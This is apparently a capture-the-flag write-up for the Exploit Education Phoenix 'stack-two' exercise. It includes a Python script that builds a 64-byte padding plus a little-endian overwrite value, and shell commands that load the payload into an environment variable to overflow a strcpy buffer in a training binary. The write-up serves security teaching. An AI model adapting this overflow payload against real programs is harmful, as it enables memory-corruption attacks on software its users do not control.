**Summery:**

Much more like the previous challenge, except here the program is:
- reading from an environment variable
- using the function `strcpy` instead of `gets` 

stack-two reads from an environment variable named 'ExploitEducation', and uses an unsafe function to
to copy the contents of the said variable to a local variable. the end goal is
to change the variable in the struct next to the buffer

**Solution:**

We'll write to the contents of the environment variable ExploitEducation and set
it to our specified buffer

```python
#!/usr/bin/env python
from struct import pack

# 64 character buffer
sixty_four = 'A' * 64
# the new value in little endian (<L) is little endian, (>L) is big endian :)
new_value_little_endian = pack("<L", 0x0d0a090a)

buf =""
buf += sixty_four
buf += new_value_little_endian
print(buf)
```
**we then set our local environment variable**
```bash
 export ExploitEducation=$(python ~/solution-stack-two.py)
 # now execute the stack-two executable
 ./stack-two 
 Welcome to phoenix/stack-two, brought to you by https://exploit.education
 Well done, you have successfully set changeme to the correct value
```
